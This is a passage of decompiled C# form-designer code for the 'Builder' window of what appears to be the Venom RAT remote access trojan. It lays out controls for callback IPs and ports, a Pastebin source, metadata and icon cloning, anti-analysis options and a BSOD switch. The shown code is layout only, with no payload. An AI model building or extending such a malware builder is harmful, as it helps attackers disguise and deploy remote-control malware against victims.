			this.txtOriginalFilename.DisabledState.PlaceholderForeColor = global::System.Drawing.Color.FromArgb(138, 138, 138);
			this.txtOriginalFilename.FillColor = global::System.Drawing.Color.FromArgb(24, 24, 24);
			this.txtOriginalFilename.FocusedState.BorderColor = global::System.Drawing.Color.FromArgb(4, 143, 110);
			this.txtOriginalFilename.FocusedState.Parent = this.txtOriginalFilename;
			this.txtOriginalFilename.Font = new global::System.Drawing.Font("Segoe UI", 9f);
			this.txtOriginalFilename.HoverState.BorderColor = global::System.Drawing.Color.FromArgb(4, 143, 110);
			this.txtOriginalFilename.HoverState.Parent = this.txtOriginalFilename;
			this.txtOriginalFilename.Location = new global::System.Drawing.Point(262, 275);
			this.txtOriginalFilename.Name = "txtOriginalFilename";
			this.txtOriginalFilename.PasswordChar = '\0';
			this.txtOriginalFilename.PlaceholderText = "";
			this.txtOriginalFilename.SelectedText = "";
			this.txtOriginalFilename.ShadowDecoration.Parent = this.txtOriginalFilename;
			this.txtOriginalFilename.Size = new global::System.Drawing.Size(190, 26);
			this.txtOriginalFilename.TabIndex = 130;
			this.btnAssembly.CheckedState.BorderColor = global::System.Drawing.Color.FromArgb(94, 148, 255);
			this.btnAssembly.CheckedState.BorderRadius = 2;
			this.btnAssembly.CheckedState.BorderThickness = 0;
			this.btnAssembly.CheckedState.FillColor = global::System.Drawing.Color.FromArgb(8, 104, 81);
			this.btnAssembly.CheckedState.Parent = this.btnAssembly;
			this.btnAssembly.Location = new global::System.Drawing.Point(112, 56);
			this.btnAssembly.Name = "btnAssembly";
			this.btnAssembly.ShadowDecoration.Parent = this.btnAssembly;
			this.btnAssembly.Size = new global::System.Drawing.Size(24, 24);
			this.btnAssembly.TabIndex = 127;
			this.btnAssembly.Text = "guna2CustomCheckBox1";
			this.btnAssembly.UncheckedState.BorderColor = global::System.Drawing.Color.Transparent;
			this.btnAssembly.UncheckedState.BorderRadius = 2;
			this.btnAssembly.UncheckedState.BorderThickness = 0;
			this.btnAssembly.UncheckedState.FillColor = global::System.Drawing.Color.Transparent;
			this.btnAssembly.UncheckedState.Parent = this.btnAssembly;
			this.btnAssembly.Click += new global::System.EventHandler(this.BtnAssembly_CheckedChanged);
			this.chkIcon.CheckedState.BorderColor = global::System.Drawing.Color.FromArgb(94, 148, 255);
			this.chkIcon.CheckedState.BorderRadius = 2;
			this.chkIcon.CheckedState.BorderThickness = 0;
			this.chkIcon.CheckedState.FillColor = global::System.Drawing.Color.FromArgb(8, 104, 81);
			this.chkIcon.CheckedState.Parent = this.chkIcon;
			this.chkIcon.Location = new global::System.Drawing.Point(550, 56);
			this.chkIcon.Name = "chkIcon";
			this.chkIcon.ShadowDecoration.Parent = this.chkIcon;
			this.chkIcon.Size = new global::System.Drawing.Size(24, 24);
			this.chkIcon.TabIndex = 127;
			this.chkIcon.Text = "guna2CustomCheckBox1";
			this.chkIcon.UncheckedState.BorderColor = global::System.Drawing.Color.Transparent;
			this.chkIcon.UncheckedState.BorderRadius = 2;
			this.chkIcon.UncheckedState.BorderThickness = 0;
			this.chkIcon.UncheckedState.FillColor = global::System.Drawing.Color.Transparent;
			this.chkIcon.UncheckedState.Parent = this.chkIcon;
			this.chkIcon.Click += new global::System.EventHandler(this.ChkIcon_CheckedChanged);
			this.btnClone.Animated = true;
			this.btnClone.BorderColor = global::System.Drawing.Color.Maroon;
			this.btnClone.BorderRadius = 5;
			this.btnClone.CheckedState.Parent = this.btnClone;
			this.btnClone.CustomImages.Parent = this.btnClone;
			this.btnClone.DisabledState.BorderColor = global::System.Drawing.Color.DarkGray;
			this.btnClone.DisabledState.CustomBorderColor = global::System.Drawing.Color.DarkGray;
			this.btnClone.DisabledState.FillColor = global::System.Drawing.Color.FromArgb(169, 169, 169);
			this.btnClone.DisabledState.ForeColor = global::System.Drawing.Color.FromArgb(141, 141, 141);
			this.btnClone.DisabledState.Parent = this.btnClone;
			this.btnClone.FillColor = global::System.Drawing.Color.FromArgb(8, 104, 81);
			this.btnClone.Font = new global::System.Drawing.Font("Segoe UI", 9f);
			this.btnClone.ForeColor = global::System.Drawing.Color.White;
			this.btnClone.HoverState.Parent = this.btnClone;
			this.btnClone.Location = new global::System.Drawing.Point(262, 49);
			this.btnClone.Name = "btnClone";
			this.btnClone.ShadowDecoration.Parent = this.btnClone;
			this.btnClone.Size = new global::System.Drawing.Size(190, 37);
			this.btnClone.TabIndex = 126;
			this.btnClone.Text = "Choose icon";
			this.btnClone.Click += new global::System.EventHandler(this.BtnClone_Click);
			this.btnIcon.Animated = true;
			this.btnIcon.BorderColor = global::System.Drawing.Color.Maroon;
			this.btnIcon.BorderRadius = 5;
			this.btnIcon.CheckedState.Parent = this.btnIcon;
			this.btnIcon.CustomImages.Parent = this.btnIcon;
			this.btnIcon.DisabledState.BorderColor = global::System.Drawing.Color.DarkGray;
			this.btnIcon.DisabledState.CustomBorderColor = global::System.Drawing.Color.DarkGray;
			this.btnIcon.DisabledState.FillColor = global::System.Drawing.Color.FromArgb(169, 169, 169);
			this.btnIcon.DisabledState.ForeColor = global::System.Drawing.Color.FromArgb(141, 141, 141);
			this.btnIcon.DisabledState.Parent = this.btnIcon;
			this.btnIcon.FillColor = global::System.Drawing.Color.FromArgb(8, 104, 81);
			this.btnIcon.Font = new global::System.Drawing.Font("Segoe UI", 9f);
			this.btnIcon.ForeColor = global::System.Drawing.Color.White;
			this.btnIcon.HoverState.Parent = this.btnIcon;
			this.btnIcon.Location = new global::System.Drawing.Point(590, 49);
			this.btnIcon.Name = "btnIcon";
			this.btnIcon.ShadowDecoration.Parent = this.btnIcon;
			this.btnIcon.Size = new global::System.Drawing.Size(150, 37);
			this.btnIcon.TabIndex = 126;
			this.btnIcon.Text = "Clone File";
			this.btnIcon.Click += new global::System.EventHandler(this.BtnIcon_Click);
			this.chkBsod.AutoSize = true;
			this.chkBsod.Location = new global::System.Drawing.Point(797, 395);
			this.chkBsod.Margin = new global::System.Windows.Forms.Padding(2);
			this.chkBsod.Name = "chkBsod";
			this.chkBsod.Size = new global::System.Drawing.Size(56, 17);
			this.chkBsod.TabIndex = 131;
			this.chkBsod.Text = "BSOD";
			this.chkBsod.UseVisualStyleBackColor = true;
			this.guna2DragControl2.TargetControl = this.guna2Panel1;
			this.guna2BorderlessForm1.AnimateWindow = true;
			this.guna2BorderlessForm1.ContainerControl = this;
			this.guna2BorderlessForm1.DockIndicatorColor = global::System.Drawing.Color.FromArgb(8, 104, 81);
			this.guna2BorderlessForm1.ShadowColor = global::System.Drawing.Color.FromArgb(8, 104, 81);
			this.txtGroup.BorderColor = global::System.Drawing.Color.FromArgb(8, 104, 81);
			this.txtGroup.Cursor = global::System.Windows.Forms.Cursors.IBeam;
			this.txtGroup.DefaultText = "Venom Clients";
			this.txtGroup.DisabledState.BorderColor = global::System.Drawing.Color.FromArgb(208, 208, 208);
			this.txtGroup.DisabledState.FillColor = global::System.Drawing.Color.FromArgb(226, 226, 226);
			this.txtGroup.DisabledState.ForeColor = global::System.Drawing.Color.FromArgb(138, 138, 138);
			this.txtGroup.DisabledState.Parent = this.txtGroup;
			this.txtGroup.DisabledState.PlaceholderForeColor = global::System.Drawing.Color.FromArgb(138, 138, 138);
			this.txtGroup.FillColor = global::System.Drawing.Color.FromArgb(24, 24, 24);
			this.txtGroup.FocusedState.BorderColor = global::System.Drawing.Color.FromArgb(4, 143, 110);
			this.txtGroup.FocusedState.Parent = this.txtGroup;
			this.txtGroup.Font = new global::System.Drawing.Font("Segoe UI", 9f);
			this.txtGroup.HoverState.BorderColor = global::System.Drawing.Color.FromArgb(4, 143, 110);
			this.txtGroup.HoverState.Parent = this.txtGroup;
			this.txtGroup.Location = new global::System.Drawing.Point(514, 294);
			this.txtGroup.Name = "txtGroup";
			this.txtGroup.PasswordChar = '\0';
			this.txtGroup.PlaceholderText = "";
			this.txtGroup.SelectedText = "";
			this.txtGroup.SelectionStart = 13;
			this.txtGroup.ShadowDecoration.Parent = this.txtGroup;
			this.txtGroup.Size = new global::System.Drawing.Size(227, 26);
			this.txtGroup.TabIndex = 133;
			this.txtMutex.BorderColor = global::System.Drawing.Color.FromArgb(8, 104, 81);
			this.txtMutex.Cursor = global::System.Windows.Forms.Cursors.IBeam;
			this.txtMutex.DefaultText = "Venom_RAT_Mutex_Venom_RAT";
			this.txtMutex.DisabledState.BorderColor = global::System.Drawing.Color.FromArgb(208, 208, 208);
			this.txtMutex.DisabledState.FillColor = global::System.Drawing.Color.FromArgb(226, 226, 226);
			this.txtMutex.DisabledState.ForeColor = global::System.Drawing.Color.FromArgb(138, 138, 138);
			this.txtMutex.DisabledState.Parent = this.txtMutex;
			this.txtMutex.DisabledState.PlaceholderForeColor = global::System.Drawing.Color.FromArgb(138, 138, 138);
			this.txtMutex.FillColor = global::System.Drawing.Color.FromArgb(24, 24, 24);
			this.txtMutex.FocusedState.BorderColor = global::System.Drawing.Color.FromArgb(4, 143, 110);
			this.txtMutex.FocusedState.Parent = this.txtMutex;
			this.txtMutex.Font = new global::System.Drawing.Font("Segoe UI", 9f);
			this.txtMutex.HoverState.BorderColor = global::System.Drawing.Color.FromArgb(4, 143, 110);
			this.txtMutex.HoverState.Parent = this.txtMutex;
			this.txtMutex.Location = new global::System.Drawing.Point(514, 325);
			this.txtMutex.Name = "txtMutex";
			this.txtMutex.PasswordChar = '\0';
			this.txtMutex.PlaceholderText = "";
			this.txtMutex.SelectedText = "";
			this.txtMutex.SelectionStart = 25;
			this.txtMutex.ShadowDecoration.Parent = this.txtMutex;
			this.txtMutex.Size = new global::System.Drawing.Size(227, 26);
			this.txtMutex.TabIndex = 134;
			this.label17.AutoSize = true;
			this.label17.Font = new global::System.Drawing.Font("Microsoft Sans Serif", 9.75f, global::System.Drawing.FontStyle.Regular, global::System.Drawing.GraphicsUnit.Point, 0);
			this.label17.ForeColor = global::System.Drawing.Color.White;
			this.label17.Location = new global::System.Drawing.Point(141, 304);
			this.label17.Margin = new global::System.Windows.Forms.Padding(2, 0, 2, 0);
			this.label17.Name = "label17";
			this.label17.Size = new global::System.Drawing.Size(88, 16);
			this.label17.TabIndex = 131;
			this.label17.Text = "Clients Group";
			this.label5.AutoSize = true;
			this.label5.Font = new global::System.Drawing.Font("Microsoft Sans Serif", 9.75f, global::System.Drawing.FontStyle.Regular, global::System.Drawing.GraphicsUnit.Point, 0);
			this.label5.ForeColor = global::System.Drawing.Color.White;
			this.label5.Location = new global::System.Drawing.Point(141, 335);
			this.label5.Margin = new global::System.Windows.Forms.Padding(2, 0, 2, 0);
			this.label5.Name = "label5";
			this.label5.Size = new global::System.Drawing.Size(43, 16);
			this.label5.TabIndex = 132;
			this.label5.Text = "Mutex";
			base.AutoScaleDimensions = new global::System.Drawing.SizeF(6f, 13f);
			base.AutoScaleMode = global::System.Windows.Forms.AutoScaleMode.Font;
			this.BackColor = global::System.Drawing.Color.FromArgb(255, 192, 128);
			base.ClientSize = new global::System.Drawing.Size(1000, 658);
			base.Controls.Add(this.guna2ShadowPanel1);
			this.ForeColor = global::System.Drawing.Color.Transparent;
			base.FormBorderStyle = global::System.Windows.Forms.FormBorderStyle.None;
			base.Icon = ((System.Drawing.Icon)(resources.GetObject("$this.Icon")));
			base.Margin = new global::System.Windows.Forms.Padding(2);
			base.Name = "FormBuilder";
			base.StartPosition = global::System.Windows.Forms.FormStartPosition.CenterScreen;
			this.Text = "Builder";
			base.Load += new global::System.EventHandler(this.Builder_Load);
			((global::System.ComponentModel.ISupportInitialize)this.picIcon).EndInit();
			((global::System.ComponentModel.ISupportInitialize)this.numDelay).EndInit();
			this.guna2ShadowPanel1.ResumeLayout(false);
			this.guna2Panel1.ResumeLayout(false);
			this.guna2Panel1.PerformLayout();
			this.guna2TabControl1.ResumeLayout(false);
			this.tabPage1.ResumeLayout(false);
			this.guna2ShadowPanel2.ResumeLayout(false);
			this.guna2ShadowPanel2.PerformLayout();
			this.tabPage2.ResumeLayout(false);
			this.guna2ShadowPanel4.ResumeLayout(false);
			this.guna2ShadowPanel4.PerformLayout();
			this.tabPage3.ResumeLayout(false);
			this.tabPage3.PerformLayout();
			this.guna2ShadowPanel3.ResumeLayout(false);
			this.guna2ShadowPanel3.PerformLayout();
			base.ResumeLayout(false);
		}

		// Token: 0x04000391 RID: 913
		private global::System.ComponentModel.IContainer components;

		// Token: 0x04000392 RID: 914
		private global::System.DirectoryServices.DirectoryEntry directoryEntry1;

		// Token: 0x04000393 RID: 915
		private global::System.Windows.Forms.ToolTip toolTip1;

		// Token: 0x04000394 RID: 916
		private global::System.Windows.Forms.Label label3;

		// Token: 0x04000395 RID: 917
		private global::System.Windows.Forms.Label label4;

		// Token: 0x04000396 RID: 918
		private global::System.Windows.Forms.PictureBox picIcon;

		// Token: 0x04000397 RID: 919
		private global::System.Windows.Forms.Label label14;

		// Token: 0x04000398 RID: 920
		private global::System.Windows.Forms.Label label13;

		// Token: 0x04000399 RID: 921
		private global::System.Windows.Forms.Label label12;

		// Token: 0x0400039A RID: 922
		private global::System.Windows.Forms.Label label11;

		// Token: 0x0400039B RID: 923
		private global::System.Windows.Forms.Label label10;

		// Token: 0x0400039C RID: 924
		private global::System.Windows.Forms.Label label9;

		// Token: 0x0400039D RID: 925
		private global::System.Windows.Forms.Label label7;

		// Token: 0x0400039E RID: 926
		private global::System.Windows.Forms.Label label8;

		// Token: 0x0400039F RID: 927
		private global::System.Windows.Forms.Label label6;

		// Token: 0x040003A0 RID: 928
		private global::System.Windows.Forms.Label label15;

		// Token: 0x040003A1 RID: 929
		private global::Guna.UI2.WinForms.Guna2ComboBox comboBoxFolder;

		// Token: 0x040003A2 RID: 930
		private global::System.Windows.Forms.Label label18;

		// Token: 0x040003A3 RID: 931
		private global::System.Windows.Forms.Label label19;

		// Token: 0x040003A4 RID: 932
		private global::Guna.UI2.WinForms.Guna2NumericUpDown numDelay;

		// Token: 0x040003A5 RID: 933
		private global::System.Windows.Forms.Label label16;

		// Token: 0x040003A6 RID: 934
		private global::System.Windows.Forms.ListBox YourListPorts;

		// Token: 0x040003A7 RID: 935
		private global::System.Windows.Forms.ListBox YourListIPs;

		// Token: 0x040003A8 RID: 936
		private global::Guna.UI2.WinForms.Guna2DragControl guna2DragControl1;

		// Token: 0x040003A9 RID: 937
		private global::Guna.UI2.WinForms.Guna2ShadowPanel guna2ShadowPanel1;

		// Token: 0x040003AA RID: 938
		private global::Guna.UI2.WinForms.Guna2CheckBox chkPaste_bin;

		// Token: 0x040003AB RID: 939
		private global::Guna.UI2.WinForms.Guna2TabControl guna2TabControl1;

		// Token: 0x040003AC RID: 940
		private global::System.Windows.Forms.TabPage tabPage1;

		// Token: 0x040003AD RID: 941
		private global::System.Windows.Forms.TabPage tabPage2;

		// Token: 0x040003AE RID: 942
		private global::System.Windows.Forms.TabPage tabPage3;

		// Token: 0x040003AF RID: 943
		private global::Guna.UI2.WinForms.Guna2Panel guna2Panel1;

		// Token: 0x040003B0 RID: 944
		private global::Guna.UI2.WinForms.Guna2ControlBox guna2ControlBox1;

		// Token: 0x040003B1 RID: 945
		private global::System.Windows.Forms.Label label1;

		// Token: 0x040003B2 RID: 946
		private global::Guna.UI2.WinForms.Guna2ShadowPanel guna2ShadowPanel2;

		// Token: 0x040003B3 RID: 947
		private global::Guna.UI2.WinForms.Guna2ShadowPanel guna2ShadowPanel4;

		// Token: 0x040003B4 RID: 948
		private global::Guna.UI2.WinForms.Guna2ShadowPanel guna2ShadowPanel3;

		// Token: 0x040003B5 RID: 949
		private global::Guna.UI2.WinForms.Guna2DragControl guna2DragControl2;

		// Token: 0x040003B6 RID: 950
		private global::Guna.UI2.WinForms.Guna2Button btnBuild;

		// Token: 0x040003B7 RID: 951
		private global::Guna.UI2.WinForms.Guna2Button btnRemoveIP;

		// Token: 0x040003B8 RID: 952
		private global::Guna.UI2.WinForms.Guna2Button btnRemovePort;

		// Token: 0x040003B9 RID: 953
		private global::Guna.UI2.WinForms.Guna2Button btnAddIP;

		// Token: 0x040003BA RID: 954
		private global::Guna.UI2.WinForms.Guna2Button btnAddPort;

		// Token: 0x040003BB RID: 955
		private global::Guna.UI2.WinForms.Guna2TextBox textIP;

		// Token: 0x040003BC RID: 956
		private global::Guna.UI2.WinForms.Guna2TextBox txtPaste_bin;

		// Token: 0x040003BD RID: 957
		private global::Guna.UI2.WinForms.Guna2TextBox textPort;

		// Token: 0x040003BE RID: 958
		private global::Guna.UI2.WinForms.Guna2Button btnClone;

		// Token: 0x040003BF RID: 959
		private global::Guna.UI2.WinForms.Guna2Button btnIcon;

		// Token: 0x040003C0 RID: 960
		private global::Guna.UI2.WinForms.Guna2CustomCheckBox chkIcon;

		// Token: 0x040003C1 RID: 961
		private global::Guna.UI2.WinForms.Guna2CustomCheckBox btnAssembly;

		// Token: 0x040003C2 RID: 962
		private global::Guna.UI2.WinForms.Guna2TextBox textFilename;

		// Token: 0x040003C3 RID: 963
		private global::Guna.UI2.WinForms.Guna2CustomCheckBox chkAnti;

		// Token: 0x040003C4 RID: 964
		private global::Guna.UI2.WinForms.Guna2CustomCheckBox chkAntiProcess;

		// Token: 0x040003C5 RID: 965
		private global::Guna.UI2.WinForms.Guna2CustomCheckBox checkBox1;

		// Token: 0x040003C6 RID: 966
		private global::Guna.UI2.WinForms.Guna2TextBox txtIcon;

		// Token: 0x040003C7 RID: 967
		private global::Guna.UI2.WinForms.Guna2TextBox txtOriginalFilename;

		// Token: 0x040003C8 RID: 968
		private global::Guna.UI2.WinForms.Guna2TextBox txtProductVersion;

		// Token: 0x040003C9 RID: 969
		private global::Guna.UI2.WinForms.Guna2TextBox txtFileVersion;

		// Token: 0x040003CA RID: 970
		private global::Guna.UI2.WinForms.Guna2TextBox txtTrademarks;

		// Token: 0x040003CB RID: 971
		private global::Guna.UI2.WinForms.Guna2TextBox txtCompany;

		// Token: 0x040003CC RID: 972
		private global::Guna.UI2.WinForms.Guna2TextBox txtDescription;

		// Token: 0x040003CD RID: 973
		private global::Guna.UI2.WinForms.Guna2TextBox txtProduct;

		// Token: 0x040003CE RID: 974
		private global::Guna.UI2.WinForms.Guna2TextBox txtCopyright;

		// Token: 0x040003CF RID: 975
		private global::System.Windows.Forms.CheckBox chkBsod;

		// Token: 0x040003D0 RID: 976
		private global::Guna.UI2.WinForms.Guna2BorderlessForm guna2BorderlessForm1;

		// Token: 0x040003D1 RID: 977
		private global::Guna.UI2.WinForms.Guna2TextBox txtGroup;

		// Token: 0x040003D2 RID: 978
		private global::Guna.UI2.WinForms.Guna2TextBox txtMutex;

		// Token: 0x040003D3 RID: 979
		private global::System.Windows.Forms.Label label17;

		// Token: 0x040003D4 RID: 980
		private global::System.Windows.Forms.Label label5;
	}
}
